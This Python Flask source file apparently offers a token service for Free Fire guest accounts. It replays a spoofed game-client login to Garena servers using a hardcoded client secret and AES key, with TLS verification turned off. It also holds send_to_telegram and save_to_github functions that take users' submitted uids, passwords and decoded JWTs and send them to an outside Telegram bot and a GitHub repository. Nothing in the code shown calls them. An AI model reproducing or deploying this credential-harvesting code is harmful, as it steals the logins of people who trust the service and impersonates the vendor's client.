from flask import Flask, request, jsonify
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import requests
import urllib3
import json
import jwt
import base64

from protobuf_decoder.protobuf_decoder import Parser

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def parse_results(parsed_results):
    result_dict = {}
    for result in parsed_results:
        field_data = {'wire_type': result.wire_type}
        if result.wire_type in ["varint", "string"]:
            field_data['data'] = result.data
        elif result.wire_type == 'length_delimited':
            field_data["data"] = parse_results(result.data.results)
        result_dict[result.field] = field_data
    return result_dict


def get_available_room(input_text):
    parsed_results = Parser().parse(input_text)
    parsed_results_dict = parse_results(parsed_results)
    json_data = json.dumps(parsed_results_dict)
    return json_data


def encrypt_api(plain_text):
    plain_text = bytes.fromhex(plain_text)
    key = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
    iv = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    cipher_text = cipher.encrypt(pad(plain_text, AES.block_size))
    return cipher_text.hex()


def guest_token(uid, password):
    url = "https://100067.connect.garena.com/oauth/guest/token/grant"
    headers = {
        "Host": "100067.connect.garena.com",
        "User-Agent": "GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close",
    }
    data = {
        "uid": uid,
        "password": password,
        "response_type": "token",
        "client_type": "2",
        "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
        "client_id": "100067",
    }
    response = requests.post(url, headers=headers, data=data)
    data = response.json()
    return TOKEN_MAKER(data['access_token'], data['open_id'])


def TOKEN_MAKER(NEW_ACCESS_TOKEN ,NEW_OPEN_ID):
        now = datetime.now()
        formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")
        PAYLOAD = b'\x1a\x132025-02-26 11:37:38"\tfree fire(\x01:\x071.109.4B"Android OS 12 / API-32 (V417IR/81)J\x08HandheldR\nFarEasToneZ\x04WIFI`\xb6\nh\xee\x05r\x03240z!ARM64 FP ASIMD AES VMH | 3200 | 4\x80\x01\xb6\x17\x8a\x01\x0fAdreno (TM) 640\x92\x01\x12OpenGL ES 3.1 V132\x9a\x01+Google|381c01cb-8076-4b38-ba8d-82e9fcb9076d\xa2\x01\x0b196.81.7.73\xaa\x01\x02en\xb2\x01 f62f20df41f715d606f9aa4eab50c16f\xba\x01\x014\xc2\x01\x08Handheld\xca\x01\x0fASUS ASUS_Z01QD\xea\x01@e3b644b9d5948573cbfb108c8748c2a572c6591f3765c0dd74ca35be92174d58\xf0\x01\x01\xca\x02\nFarEasTone\xd2\x02\x04WIFI\xca\x03 7428b253defc164018c604a1ebbfebdf\xe0\x03\xf7\xe7\x07\xe8\x03\xc7\x9c\x07\xf0\x03\xdf\x0f\xf8\x03\xd8\x03\x80\x04\xf0\xcf\x07\x88\x04\xf7\xe7\x07\x90\x04\xf0\xcf\x07\x98\x04\xf7\xe7\x07\xc8\x04\x01\xd2\x04Z/data/app/~~DU1LSbOZLYG2A5VLbN0WZQ==/com.dts.freefireth-1b9m6zyibisQ5M3uWpDSIA==/lib/arm64\xe0\x04\x01\xea\x04z5b892aaabd688e571f688053118a162b|/data/app/~~DU1LSbOZLYG2A5VLbN0WZQ==/com.dts.freefireth-1b9m6zyibisQ5M3uWpDSIA==/base.apk\xf0\x04\x03\xf8\x04\x02\x8a\x05\x0264\x9a\x05\n2019118074\xb2\x05\tOpenGLES2\xb8\x05\xff\x7f\xc0\x05\x04\xca\x05"\x11WM\x13S[\x05U\x1d\x01YE\x08XDV\x13>^V\t\\\txR\x12\\T\x10\x01;\x08\x017\xe0\x05\xea\x97\x01\xea\x05\x07android\xf2\x05\\KqsHT8TsAERdcB/BALWD3p59G/f0G9wpQD/TLbEeONYphqTicT5jgH51g/TNVUseUYpNzzjJ+CAy1j1lFH3YEX9DAiw=\xf8\x05\xfb\xe4\x06\x82\x06\x14{"cur_rate":[60,15]}\x88\x06\x01\x90\x06\x01\x9a\x06\x014\xa2\x06\x014'
        PAYLOAD = PAYLOAD.replace(b"2025-02-26 11:37:38" , formatted_time.encode("UTF-8")) 
        PAYLOAD = PAYLOAD.replace(b"e3b644b9d5948573cbfb108c8748c2a572c6591f3765c0dd74ca35be92174d58" , NEW_ACCESS_TOKEN.encode("UTF-8"))
        PAYLOAD = PAYLOAD.replace(b"f62f20df41f715d606f9aa4eab50c16f" , NEW_OPEN_ID.encode("UTF-8"))
        PAYLOAD = PAYLOAD.hex()
        PAYLOAD = encrypt_api(PAYLOAD)
        PAYLOAD = bytes.fromhex(PAYLOAD)
        URL = "https://loginbp.ggblueshark.com/MajorLogin"
        headers = {
            "Expect": "100-continue",
            "Authorization": "Bearer",
            "X-Unity-Version": "2018.4.11f1",
            "X-GA": "v1 1",
            "ReleaseVersion": "OB52",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(PAYLOAD.hex())),
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; ASUS_Z01QD Build/V417IR)",
            "Host": "loginbp.ggblueshark.com",
            "Connection": "close",
            "Accept-Encoding": "gzip, deflate, br"
        }
        RESPONSE = requests.post(URL, headers=headers, data=PAYLOAD,verify=False)
        if RESPONSE.status_code == 200:
            json_result = get_available_room(RESPONSE.content.hex())
            parsed_data = json.loads(json_result)
            BASE64_TOKEN = parsed_data['8']['data']
            return BASE64_TOKEN


def save_to_github(lock_region, new_entry):
    filename = f"token_{lock_region}.json"
    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{filename}"
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}",
        "Accept": "application/vnd.github.v3+json"
    }

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        content = response.json()
        sha = content['sha']
        existing_data = json.loads(base64.b64decode(content['content']).decode('utf-8'))

        # Check if UID and password already exist
        for entry in existing_data:
            if entry["uid"] == new_entry["uid"] and entry["password"] == new_entry["password"]:
                print("Entry already exists. Skipping save.")
                return  # Exit early if already exists
    else:
        existing_data = []
        sha = None

    existing_data.append(new_entry)

    encoded_content = base64.b64encode(json.dumps(existing_data, indent=2).encode('utf-8')).decode('utf-8')
    payload = {
        "message": f"Update token data for lock_region {lock_region}",
        "content": encoded_content,
        "branch": GITHUB_BRANCH
    }
    if sha:
        payload["sha"] = sha

    result = requests.put(url, headers=headers, json=payload)
    if not result.ok:
        print("GitHub update failed:", result.text)


def send_to_telegram(uid, password, jwt_token):
    try:
        decoded = jwt.decode(jwt_token, options={"verify_signature": False})
        lock_region = decoded.get("lock_region", "unknown")

        formatted_creds = {
            "uid": int(uid),
            "password": password
        }

        save_to_github(lock_region, formatted_creds)

        text = f"""<b>UID & Password</b>
<pre>{json.dumps({'UID': uid, 'Password': password}, indent=2)}</pre>

<b>Decoded JWT</b>:
<pre>{json.dumps(decoded, indent=2)}</pre>"""

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": text,
            "parse_mode": "HTML"
        }
        response = requests.post(url, data=data)
        if not response.ok:
            print("Telegram send failed:", response.text)

    except Exception as e:
        print("Error sending to Telegram or GitHub:", e)


@app.route('/get-token', methods=['GET', 'POST'])
def get_token_api():
    if request.method == 'POST':
        data = request.get_json()
        uid = data.get('uid')
        password = data.get('password')
    else:
        uid = request.args.get('uid')
        password = request.args.get('password')

    if not uid or not password:
        return jsonify({"error": "uid and password required"}), 400

    try:
        token = guest_token(uid, password)
        return jsonify({"token": token,"credit":"@tanhung11231"})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=False, host='0.0.0.0', port=5000)